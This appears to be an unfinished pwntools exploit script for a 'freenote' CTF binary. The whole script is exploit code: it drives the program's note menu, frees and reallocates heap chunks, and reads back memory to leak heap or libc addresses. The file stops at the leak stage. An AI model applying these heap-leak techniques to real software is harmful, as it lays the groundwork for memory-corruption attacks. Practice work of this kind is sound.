#!/usr/bin/env python2.7

from pwn import  *

context.os="linux"
context.arch="amd64"
#context.log_level="DEBUG"

def menu():
    global r
    r.recvuntil("choice: ")

def add(size, c):
    global r
    menu()
    r.sendline("2")
    r.recvuntil("note: ")
    r.sendline(str(size))
    r.sendline(c*size)

def show(delim):
    menu()
    data=""
    r.sendline("1")
    buf=""
    while not delim in buf: 
        buf+=r.recv(1)
        data+=buf
    return data
    

def edit(idx,size,c):
    menu()
    r.sendline("3")
    r.recvuntil("number: ")
    r.sendline(str(idx))
    r.recvuntil("note: ")
    r.sendline(c*size)
    r.recvuntil("note: ")
    r.sendline(c*size)

def delete(idx):
    menu()
    r.sendline("4")
    r.recvuntil("number: ")
    r.sendline(str(idx))

def main():
    global r
    r=process("./freenote")
    add(0x80,"A")
    add(0x80,"B")
    #add(12,"C")
    delete(0)
    add(1,"\xb8")
    raw_input("[DEBUG]: {}".format(r.proc.pid))
    data=hexdump(show("1. BBBB"))
    print hexdump(data)
 #   log.info("Leak libc @ {}".format(hex(data)))

if __name__=="__main__":
    main()
